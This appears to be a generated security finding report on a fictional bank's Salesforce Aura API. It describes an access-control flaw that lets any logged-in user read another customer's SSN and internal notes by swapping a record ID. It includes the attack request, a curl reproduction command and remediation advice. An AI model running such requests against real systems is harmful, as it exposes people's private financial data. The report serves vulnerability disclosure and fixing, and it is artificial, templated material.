# Security Analysis Report
**System:** NexaBank Open Finance API (Salesforce-Integrated)
**Domain:** Financial Services / Retail Banking
**Example ID:** SF-0152
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority — attacker supplies any `contactId` in `c.ContactController.updateContact` to read banking Contact records owned by other users; `without sharing` bypasses OWD=Private |

---

## Finding 1 — Insecure Design: Client-Assumed Authority (Pattern 3.1)

### Summary
The Aura controller `c.ContactController.updateContact` on NexaBank Open Finance API (`7c2e47c8.lightning.force.com`) has a client-assumed authority design flaw: the API trusts the client-supplied `contactId` without verifying ownership. The `ContactController` runs `without sharing`, bypassing OWD=Private on the Contact object. Per §5.0 Pattern 3.1, an attacker with a valid Salesforce session substitutes a victim's `contactId` (`00147C8`) to read their banking Contact record, exposing SSN and internal notes.

**Context.txt inconsistency (documented):** §4.0 Apex class defines method `getContactDetails`, but §5.0 and §6.0 HAR use `c.ContactController.updateContact`. These conflict. The HAR (§6.0) is the primary evidence — `c.ContactController.updateContact` is the authoritative affected Aura descriptor.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.ContactController.updateContact`
**Affected endpoint:** `POST https://7c2e47c8.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://7c2e47c8.lightning.force.com/aura
Authorization: Bearer 00D7C2E47C8!AR7c2e47c8...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D7C2E47C8!AR7c2e47c8...

message={
  "actions": [{
    "id": "1;a",
    "descriptor": "c.ContactController.updateContact",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "contactId": "00147C8",
      "fields": ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]
    }
  }]
}
```

**Response — Victim Contact Record Returned**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "00147C8",
        "Name": "Victim Contact Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-94-7686"
      }]
    },
    "error": []
  }]
}
```
Victim's SSN `000-94-7686` and internal notes exposed. `OwnerId: 005VICTIM` confirms the record belongs to a different user.

### Steps to Reproduce
1. Authenticate to NexaBank on `7c2e47c8.lightning.force.com` and obtain a valid session token.
2. POST to `/aura` substituting a victim's `contactId`:
```bash
curl -s -X POST "https://7c2e47c8.lightning.force.com/aura" \
  -H "Authorization: Bearer 00D7C2E47C8!AR7c2e47c8..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: 00D7C2E47C8!AR7c2e47c8..." \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN","params":{"contactId":"00147C8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}'
# Vulnerable: returns SensitiveData__c (SSN: 000-94-7686) and InternalNotes__c for victim contact 00147C8
# Secure: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Permissions"}]}]}
```

### Remediation
1. Declare `ContactController` as `with sharing` to enforce OWD=Private.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Add `WITH SECURITY_ENFORCED` to SOQL query.
